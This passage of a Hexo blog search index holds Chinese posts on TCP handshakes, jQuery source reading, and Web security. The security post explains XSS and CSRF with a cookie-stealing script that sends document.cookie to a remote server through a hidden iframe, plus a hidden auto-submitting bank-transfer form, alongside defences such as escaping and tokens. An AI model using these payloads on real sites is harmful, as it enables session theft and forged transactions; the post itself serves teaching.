因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。]]></content>
      <tags>
        <tag>http、TCP/IP</tag>
        <tag>前后端通信</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery源码解读2]]></title>
    <url>%2F2018%2F08%2F14%2FjQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB2%2F</url>
    <content type="text"><![CDATA[构造jQuery对象 jQuery对象是一个类数组对象，含有连续的整形属性、length属性和大量的jQuery方法。jQuery对象右构造函数jQuery创建，$()是jQuery()的缩写 构造函数jQuery 调用构造函数时传入的参数不同，创建jQuery对象的逻辑也会随之不同，构造函数有7种用法； jQuery(selector[,context]) 这个函数接收一个包含CSS选择器的字符串，然后用这个字符串去匹配一组元素。jQuery 的核心功能都是通过这个函数实现的。jQuery中的一切都基于这个函数，或者说都是在以某种方式使用这个函数。这个函数最基本的用法就是向它传递一个表达式（通常由CSS选择器组成），然后根据这个表达式来查找所有匹配的元素。默认情况下,如果没有指定context参数，$()将在当前的 HTML document中查找 DOM 元素；如果指定了 context 参数，如一个 DOM 元素集或 jQuery 对象，那就会在这个 context 中查找。在jQuery 1.3.2以后，其返回的元素顺序等同于在context中出现的先后顺序。 jQuery(html,[ownerDocument]) 根据提供的原始 HTML 标记字符串，动态创建由 jQuery 对象包装的 DOM 元素。同时设置一系列的属性、事件等。 你可以传递一个手写的HTML字符串，或者由某些模板引擎或插件创建的字符串，也可以是通过 AJAX 加载过来的字符串。但是在你创建 input 元素的时会有限制。当然这个字符串可以包含斜杠(比如一个图像地址)，还有反斜杠。当你创建单个元素时，请使用闭合标签或XHTML格式。例如，创建一个 span ，可以用$(““) 或 $(““) ，但不推荐 $(““)。在jQuery中，这个语法等同于$(document.createElement(“span”)) 。 jQuery(element)、(elementArray) 如果传入一个DOM元素或者一个DOM元素数组，则将DOM元素封装成jQuery对象并返回，那么这个DOM元素就变成了jQuery对象，可以调用jQuery上的方法。比如：在监听函数中，或者在事件中的this,$(this)之后，这个this就由原生的对象变成jQuery对象，就可以调用jQuery上的方法，比如sideUp、slideDown… 123$("#box").click(function()&#123;$(this).slideUp();&#125;) jQuery(Object) 传入一个普通的JavaScript对象，jQuery就会把这个JavaScript对象包装成jQuery对象并返回，方便在对象上绑定事件和方法 jQuery(callback) 如果传入一个函数，则在document上绑定一个ready事件监听函数，ready事件的监听函数的触发要早于onload事件，ready事件的触发是在DOM结构加载完成时触发，而onload事件是在所有资源加载完成时触发。 jQuery(jQuery Object)如果传入的是一个jQuery对象，则重新拷贝一份，将拷贝副本返回，这个副本跟原来的jQuery对象的用法是一样的，都可以调用jQuery上的方法。他们引用的是完全相同的DOM元素 jQuery() 如果不传入任何东西，则返回的是一个空的jQuery对象，它的length属性是0]]></content>
      <tags>
        <tag>jQuery源码解读</tag>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery源码解读1]]></title>
    <url>%2F2018%2F08%2F14%2FjQuery%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB1%2F</url>
    <content type="text"><![CDATA[jQuery源码解读1一万多行的jQuery源码着实让我恐惧，但是jQuery是一个优秀的JavaScript类库，里面封装的方法，jQuery源码里面把函数的三种身份变现的淋漓尽致、原型链、各种设计思想、让人不禁感叹编程之美。抱着提高编程能力和编程思想的目的，我把源码的注释删掉之后又鼓起勇气重新来看。边看边做下笔记。先对jQuery做一下小的介绍：首先，jQuery是一个优秀的JavaScript类库：它提供了一些常用的方法，我们在开发项目的时候，随时可以引入这些类库，实现我们的业务需求。常用类库：jQuery(常用于PC端)，zepto(常用于移动端)。相比于其他的类似UI组件、插件、框架有一定的不同点。 UI组件：UI组件：通过html css js组成，我们使用的时候，直接引入就可以了，常用的UI组件：bootstrap antDesign 插件：带有一定的业务逻辑。比如说选项卡插件，轮播图插件；我们在项目开发的时候，重复的业务可以用插件来替代；比如说常用的插件：swiper iscroll Echarts; 框架：它具有一定的编程思想，我们开发的时候需要按照它提供的编程思想进行开发，它提供了相对应的ui组件和功能插件，常用的框架有：React Vue Augular Backbone 1234567891011121314151617181920(function( global, factory ) &#123; if ( typeof module === "object" &amp;&amp; typeof module.exports === "object" ) &#123; module.exports = global.document ? factory( global, true ) : function( w ) &#123; if ( !w.document ) &#123; throw new Error( "jQuery requires a window with a document" ); &#125; return factory( w ); &#125;; &#125; else &#123; factory( global ); &#125;&#125;(typeof window !== "undefined" ? window : this, function( window, noGlobal ) &#123;....if ( typeof noGlobal === strundefined ) &#123; window.jQuery = window.$ = jQuery; &#125; return jQuery;&#125;)); 自调用匿名函数” 首先，源码一开始采用了闭包的方法，将代码放在了一个自执行函数中，这种方法称之为“自调用匿名函数”，当浏览器加载完成jQuery文件之后，就会立即执行该函数，初始化各个模块。 为什么需要自调用匿名函数呢？ 通过自调用匿名函数创建了一个特殊的作用域，保护里面的私有变量不受外界干扰，避免了全局变量污染的问题。由于jQuery会被应用在成千上万的代码中，为了防止命令以及变量的冲突，自调用函数的设计就防止了与外界变量的冲突。那么，外界需要用到jQuery对象的话，应该怎么办呢？jQuery提供了一个出口，将jQuery对象暴露在全局对象window下,window.jQuery = window.$ = jQuery;也就是说，在外界只要执行jQuery或者$就可以使用jQuery对象封装的方法了。 为什么自调用匿名函数需要传入window/global？和工厂函数？ 因为在浏览器端的全局对象是window，如果程序跑在服务端的node环境下，全局变量是global，将全局变量作为参数传递进去时，jQuery对象就可以更快的访问到全局对象，另外，全局对象作为参数传递进去的时候，可以在代码压缩的时候进行优化; 自调用匿名函数前后不能省略分号 如果没有给自调用匿名函数的末尾加上分号，那么下一个匿名函数的第一个括 号会被当做函数来执行。比如 123(function()&#123;&#125;)()(function()&#123;&#125;)()//undefined is not a function]]></content>
      <categories>
        <category>jQuery</category>
        <category>源码</category>
      </categories>
      <tags>
        <tag>jQuery源码解读</tag>
        <tag>jQuery@1.11.3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Web安全之XSS和CSRF]]></title>
    <url>%2F2018%2F08%2F11%2FWeb%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E5%92%8CCSRF%2F</url>
    <content type="text"><![CDATA[今天听了一节web安全的课程，对这个模块不是很熟悉，找了几篇博客总结一下知识点，方便以后复习，这也是我今天搭建博客之后的第一篇博客，鼓励自己多写多记吧! Web安全之XSS和CSRFXSSXSS定义跨站脚本攻击，通过客户端脚本语言在一个论坛发帖(其他input类型的输入框也可以)中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫XSS！ XSS跨站脚本攻击 Cross site Scipting主要原因是多数用户的输入没有被转义，而直接执行。XSS可以获取到用户cookie或隐私客户端信息。 比如通过location.hash假设某个网站有一段脚本 1$("#box").html(location.hash.replace('#','')); 攻击者看到伪造URL 1location.href = "http://a.com?"+document.cookie;获取用户cookie! 也就是说它利用了网站的某个漏洞，然后把脚本注入该网页，让其他登录的用户登录后就会把该用户的信息获取到并发送给一个恶意的服务器。把压缩后的url发给某个登录的用户 一个网页的评论有漏洞(没有转义)12345678910111213141516&lt;script type="text/javascript"&gt;(function(window, document) &#123; // 构造泄露信息用的 URL var cookies = document.cookie; var xssURIBase = "http://192.168.123.123/myxss/"; var xssURI = xssURIBase + window.encodeURI(cookies); // 建立隐藏 iframe 用于通讯 var hideFrame = document.createElement("iframe"); hideFrame.height = 0; hideFrame.width = 0; hideFrame.style.display = "none"; hideFrame.src = xssURI; // 开工 document.body.appendChild(hideFrame);&#125;)(window, document);&lt;/script&gt; 那么这段代码就会被执行，这个代码会携带着登录用户的信息传输给http://192.168.123.123/myxss/ 服务器，然后服务器的代码就会接收了用户的隐式信息!主要原理就是注入脚本到安全漏洞，然后发送给另外一个站点 解决防范我们不需要用户输入HTML也是输入纯文本，转义是个很好的方法。可以用白名单重复处理。用户输入的HTML可能有很复杂的结构，但我们并不将这些数据直接存入数据库，而是使用 HTML 解析库遍历节点，获取其中数据（之所以不使用 XML 解析库是因为 HTML要求有较强的容错性）。然后根据用户原有的标签属性，重新构建 HTML 元素树。构建的过程中，所有的标签、属性都只从白名单中拿取。这样可以确保万无一失——如果用户的某种复杂输入不能为解析器所识别 CSRF：cross-site Request Forgery跨站请求伪造：冒充用户发起请求，完成一些违背用户真实意愿的请求~ CSRF可以做什么你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。 CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。 CSRF原理图 XSS和CSRF的关系 CSRF更加强调一种形式，只要是伪造用户发起的请求都是CSRF攻击，而XSS更加强调是一种手段。 CSRF可以是XSS实现，也可以是其他形式来伪造请求，只要是伪造了请求即CSRF。完成CSRF需要两个步骤： 1.登陆受信任的网站A，在本地生成 COOKIE 2.在不登出A的情况下，或者本地 COOKIE 没有过期的情况下，访问危险网站B。(也有可能B要求访问A网站) CSRF不需要知道sessionid就能让用户中招。 原理CSRF在另一个网站构造一个表单提交，提交地址是a 1&lt;form id='test' method='POST' action="http://a.com/guestbook"/ &gt; 攻击者只要引导登录a的用户访问这个b网站，自动提交一个留言，这个提交到a网站的过程中，浏览器会将用户的cookie发送到服务器。 三种攻击模式假设B网站有一段HTML代码 1&lt;img src=http://www.bank.com/Transfer.php?BankId=1122&amp;money=1000&gt; 在你登录A网站的时候，会先获取资源，同时留下你的cooki。然后当你再去访问B网站的时候，B会通过img的src属性隐式发送请求给A网站，达到模拟你发送请求的目的，来获取你的资源以及信息。 使用POST来完成敏感操作（更新数据）12345&lt;form action="Transfer.php" method="POST"&gt; &lt;p&gt;BankId: &lt;input type="text" name="toBankId" /&gt;&lt;/p&gt; &lt;p&gt;Money: &lt;input type="text" name="money" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type="submit" value="Transfer" /&gt;&lt;/p&gt; &lt;/form&gt; 危险网站B，可以通过后台使用REQUEST去获取请求的数据，而_REQUEST既可以获取get请求的数据也可以获取post请求的数据 node.js在node.js中，可以处理post请求的URL后面参数部分 12eq.body.username;//处理请求体request bodyreq.query.username;//处理查询字符串 只使用POST请求，只处理POST请求体的数据危险网站B将代码修改 1234567891011121314151617181920&lt;html&gt; &lt;head&gt; &lt;script type="text/javascript"&gt; function steal() &#123; iframe = document.frames["steal"]; iframe.document.Submit("transfer"); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload="steal()"&gt; &lt;iframe name="steal" display="none"&gt; &lt;form method="POST" name="transfer" action="http://www.Bank.com/Transfer.php"&gt; &lt;input type="hidden" name="BankId" value="11"&gt; &lt;input type="hidden" name="money" value="1000"&gt; &lt;/form&gt; &lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; B网站创建了一个iframe标签，并且把它设置为display:none，隐藏表单属性，偷偷给网站A发送请求，提前把表单提交值设设置好，提交给A网站 源于web的身份验证机制CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！ 防御机制服务端进行CSRF防御在客户端页面增加随机数。Cookie Hashing，就是构造加密的cookie信息。由于攻击者无法获取第三方cookie，那么表单的数据就构造失败。它不知道提交什么给服务器在表单里增加Hash值，在服务端验证 123456&lt;form method=”POST” action=”transfer.php”&gt; &lt;input type=”text” name=”BankId”&gt; &lt;input type=”text” name=”money”&gt; &lt;input type=”hidden” name=”hash” value=”&lt;?=$hash;?&gt;”&gt; &lt;input type=”submit” name=”submit” value=”Submit”&gt; &lt;/form&gt; 验证码每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，这个方案可以完全解决CSRF，但在易用性方面似乎不是太好。 token首先服务器端要以某种策略生成随机字符串，作为令牌（token），保存在 Session 里。然后在发出请求的页面，把该令牌以隐藏域一类的形式，与其他信息一并发出。在接收请求的页面，把接收到的信息中的令牌与 Session 中的令牌比较，只有一致的时候才处理请求，否则返回 HTTP 403 拒绝请求或者要求用户重新登录验证身份。利用Token，嵌入到session中，当进行登录操作的时候就生成这个token，也就是说每次表单被渲染的时候，后台就会生成一个伪随机值来覆盖以前的伪随机值：用户只能成功提交他最后打开的表单，因为所有其他的表单都有非法的伪随机值。请求令牌虽然使用起来简单，但并非不可破解，使用不当会增加安全隐患。 令牌在不同页面最好是不同的使用全局的token可能会导致破解难度下降，因为令牌方法理论上是可破解的， 配合验证码 无论是验证码还是令牌，验证通过一定要销毁]]></content>
      <tags>
        <tag>web安全</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F08%2F10%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
